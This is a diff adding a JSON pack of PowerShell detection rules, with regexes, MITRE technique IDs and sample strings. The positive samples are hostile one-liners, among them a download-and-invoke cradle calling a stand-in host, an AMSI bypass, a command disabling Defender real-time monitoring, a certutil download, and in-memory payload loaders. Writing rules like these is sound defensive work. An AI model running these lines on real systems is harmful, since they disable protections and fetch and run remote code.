@@ -1,0 +1,605 @@
+{
+ "pack": "powershell",
+ "rules": [
+  {
+   "id": "byte-ps-download-iex",
+   "name": "PowerShell download-and-invoke cradle",
+   "description": "A web client download (DownloadString/DownloadData/Invoke-WebRequest) piped into Invoke-Expression.",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "(?:Net\\.WebClient|System\\.Net\\.WebClient|Invoke-WebRequest|\\biwr\\b|Invoke-RestMethod|\\birm\\b|DownloadString|DownloadData)",
+     "nocase": true
+    },
+    {
+     "name": "i",
+     "type": "regex",
+     "value": "\\bIEX\\b|\\bInvoke-Expression\\b|\\|\\s*iex\\b",
+     "nocase": true
+    },
+    {
+     "name": "u",
+     "type": "regex",
+     "value": "https?://[^\\s'\\\"]{4,}",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "d"
+     },
+     {
+      "str": "i"
+     },
+     {
+      "str": "u"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')"
+     }
+    ],
+    "negative": [
+     {
+      "text": "(New-Object Net.WebClient).DownloadFile('http://x.example/a.zip','a.zip')"
+     },
+     {
+      "text": "iex $cmd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-encoded-hidden",
+   "name": "PowerShell encoded command with hidden window",
+   "description": "powershell with -enc/-EncodedCommand plus -NoP/-W Hidden/-NonI style flags.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.010",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "p",
+     "type": "regex",
+     "value": "\\bpowershell(?:\\.exe)?\\b",
+     "nocase": true
+    },
+    {
+     "name": "e",
+     "type": "regex",
+     "value": "\\s-(?:e|en|enc|enco|encod\\w*|ec)\\s+[A-Za-z0-9+/=]{20,}",
+     "nocase": true
+    },
+    {
+     "name": "h",
+     "type": "regex",
+     "value": "\\s-(?:w|win|window\\w*)\\s+hidden|\\s-nop\\b|\\s-noni\\b|\\s-noprofile\\b|\\s-nonint\\w*",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "p"
+     },
+     {
+      "str": "e"
+     },
+     {
+      "str": "h"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "powershell.exe -NoP -W Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt"
+     }
+    ],
+    "negative": [
+     {
+      "text": "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
+     },
+     {
+      "text": "powershell -NoP -W Hidden -File x.ps1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-frombase64-iex",
+   "name": "PowerShell decode-and-run of an embedded blob",
+   "description": "[Convert]::FromBase64String with GetString and IEX in the same script.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.010",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "f",
+     "type": "ascii",
+     "value": "FromBase64String",
+     "nocase": true
+    },
+    {
+     "name": "g",
+     "type": "regex",
+     "value": "GetString|Encoding\\]::(?:UTF8|Unicode|ASCII)",
+     "nocase": true
+    },
+    {
+     "name": "i",
+     "type": "regex",
+     "value": "\\bIEX\\b|Invoke-Expression",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "f"
+     },
+     {
+      "str": "g"
+     },
+     {
+      "str": "i"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); IEX $d"
+     }
+    ],
+    "negative": [
+     {
+      "text": "$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output $d"
+     },
+     {
+      "text": "IEX $x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-deflate-blob",
+   "name": "PowerShell compressed payload cradle",
+   "description": "DeflateStream/GzipStream over a base64 MemoryStream and IEX.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.010",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "IO\\.Compression\\.(?:Deflate|GZip)Stream",
+     "nocase": true
+    },
+    {
+     "name": "m",
+     "type": "ascii",
+     "value": "MemoryStream",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "FromBase64String",
+     "nocase": true
+    },
+    {
+     "name": "i",
+     "type": "regex",
+     "value": "\\bIEX\\b|Invoke-Expression",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "c"
+     },
+     {
+      "str": "m"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "i"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "IEX (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('x'))),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()"
+     }
+    ],
+    "negative": [
+     {
+      "text": "New-Object IO.Compression.GZipStream($in, [IO.Compression.CompressionMode]::Decompress); $m = New-Object IO.MemoryStream"
+     },
+     {
+      "text": "IEX"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-assembly-load",
+   "name": "PowerShell in-memory .NET assembly load",
+   "description": "[Reflection.Assembly]::Load of a base64 payload and invocation of an entry point.",
+   "tactic": "Defense Evasion",
+   "technique": "T1620",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\[(?:System\\.)?Reflection\\.Assembly\\]::Load(?:File|From)?\\s*\\(",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "FromBase64String",
+     "nocase": true
+    },
+    {
+     "name": "i",
+     "type": "regex",
+     "value": "\\.EntryPoint|\\.Invoke\\s*\\(|GetMethod\\s*\\(|CreateInstance",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "i"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "$a=[Reflection.Assembly]::Load([Convert]::FromBase64String($p)); $a.EntryPoint.Invoke($null,$null)"
+     }
+    ],
+    "negative": [
+     {
+      "text": "[Reflection.Assembly]::Load('System.Windows.Forms')"
+     },
+     {
+      "text": "FromBase64String EntryPoint"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-shellcode-runner",
+   "name": "PowerShell shellcode runner via Add-Type",
+   "description": "Add-Type of P/Invoke VirtualAlloc/CreateThread/RtlMoveMemory: the in-process shellcode runner.",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "t",
+     "type": "ascii",
+     "value": "Add-Type",
+     "nocase": true
+    },
+    {
+     "name": "v",
+     "type": "ascii",
+     "value": "VirtualAlloc"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "CreateThread|RtlMoveMemory|Marshal\\]::Copy"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "t"
+     },
+     {
+      "str": "v"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "Add-Type -MemberDefinition '[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(...); CreateThread' -Name W"
+     }
+    ],
+    "negative": [
+     {
+      "text": "Add-Type -AssemblyName System.Windows.Forms"
+     },
+     {
+      "text": "VirtualAlloc CreateThread"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-amsi-bypass",
+   "name": "PowerShell AMSI bypass idiom",
+   "description": "amsiInitFailed or AmsiUtils reflection used to switch off script scanning.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "amsiInitFailed|AmsiUtils|amsiContext|AmsiScanBuffer",
+     "nocase": true
+    },
+    {
+     "name": "r",
+     "type": "regex",
+     "value": "GetField\\s*\\(|NonPublic|SetValue\\s*\\(|VirtualProtect|Marshal\\]::Copy",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "r"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+     }
+    ],
+    "negative": [
+     {
+      "text": "amsiInitFailed documentation"
+     },
+     {
+      "text": "GetField('x') SetValue"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-powersploit-names",
+   "name": "PowerSploit / offensive PowerShell function names",
+   "description": "Public offensive PowerShell function names (Invoke-Mimikatz, Invoke-Shellcode, Invoke-ReflectivePEInjection, Invoke-TokenManipulation, Invoke-Kerberoast).",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "n",
+     "type": "regex",
+     "value": "\\bInvoke-(?:Mimikatz|Shellcode|ReflectivePEInjection|TokenManipulation|Kerberoast|DllInjection|NinjaCopy|PsExec|Portscan|WMICommand)\\b",
+     "nocase": true
+    },
+    {
+     "name": "f",
+     "type": "regex",
+     "value": "\\bfunction\\s+Invoke-|\\bImport-Module\\b|\\.\\s+\\.\\\\|\\bIEX\\b",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "n"
+     },
+     {
+      "str": "f"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "function Invoke-Mimikatz { param($DumpCreds) }"
+     }
+    ],
+    "negative": [
+     {
+      "text": "Invoke-Mimikatz"
+     },
+     {
+      "text": "function Invoke-Backup {}"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-defender-disable",
+   "name": "Defender protection switched off",
+   "description": "Set-MpPreference/Add-MpPreference weakening real-time monitoring or adding wide exclusions.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:Set|Add)-MpPreference\\s+[^\\n]{0,80}(?:-DisableRealtimeMonitoring\\s+\\$?(?:true|1)|-ExclusionPath\\s+['\\\"]?[A-Za-z]:\\\\?['\\\"]?(?:\\s|$|,)|-DisableIOAVProtection\\s+\\$?(?:true|1)|-ExclusionExtension)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "Set-MpPreference -DisableRealtimeMonitoring $true"
+     }
+    ],
+    "negative": [
+     {
+      "text": "Set-MpPreference -ScanAvgCPULoadFactor 30"
+     },
+     {
+      "text": "Get-MpPreference"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-bits-certutil-download",
+   "name": "Living-off-the-land download via BITS/certutil",
+   "description": "bitsadmin /transfer, Start-BitsTransfer or certutil -urlcache -f fetching a remote URL.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "bitsadmin(?:\\.exe)?\\s+/transfer\\s+\\S+\\s+https?://|certutil(?:\\.exe)?\\s+[^\\n]{0,40}-urlcache\\s+[^\\n]{0,20}-f\\s+https?://|Start-BitsTransfer\\s+[^\\n]{0,60}-Source\\s+https?://",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "certutil.exe -urlcache -split -f http://x.example/p.exe p.exe"
+     }
+    ],
+    "negative": [
+     {
+      "text": "certutil -hashfile a.bin SHA256"
+     },
+     {
+      "text": "bitsadmin /list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-ps-invoke-webrequest-exe",
+   "name": "PowerShell fetching an executable to disk and starting it",
+   "description": "Invoke-WebRequest/DownloadFile of an .exe/.dll followed by Start-Process in the same script.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "(?:DownloadFile|Invoke-WebRequest|iwr|Start-BitsTransfer)\\b[^\\n]{0,120}\\.(?:exe|dll|msi|scr)\\b",
+     "nocase": true
+    },
+    {
+     "name": "s",
+     "type": "regex",
+     "value": "Start-Process|\\[Diagnostics\\.Process\\]::Start|&\\s*\\$\\w+|cmd\\s*/c",
+     "nocase": true
+    },
+    {
+     "name": "t",
+     "type": "regex",
+     "value": "\\$env:(?:TEMP|APPDATA|PUBLIC)|%TEMP%|C:\\\\Users\\\\Public",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "d"
+     },
+     {
+      "str": "s"
+     },
+     {
+      "str": "t"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "iwr http://x.example/a.exe -OutFile $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "text": "iwr http://x.example/a.exe -OutFile a.exe; Start-Process a.exe"
+     },
+     {
+      "text": "Start-Process $env:TEMP\\a.exe"
+     }
+    ]
+   }
+  }
+ ]
+}
